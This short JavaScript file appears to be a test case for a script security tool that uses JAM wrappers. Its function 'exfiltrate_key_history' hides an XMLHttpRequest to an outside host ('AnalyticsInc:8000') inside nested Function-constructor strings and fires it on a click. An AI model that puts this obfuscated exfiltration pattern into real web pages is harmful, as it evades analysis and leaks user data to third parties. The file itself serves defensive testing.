function exfiltrate_key_history() {
  var nest = new String('var exp=\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest2", true);xmlhttp.send(null);\';return Function(exp);');
  var top$$2 = JAM.call(Function, null, [nest]);
  var sub = top$$2();
  sub();
  return
}
var v0 = document.getElementById("test");
JAM.set(v0, "onclick", exfiltrate_key_history);
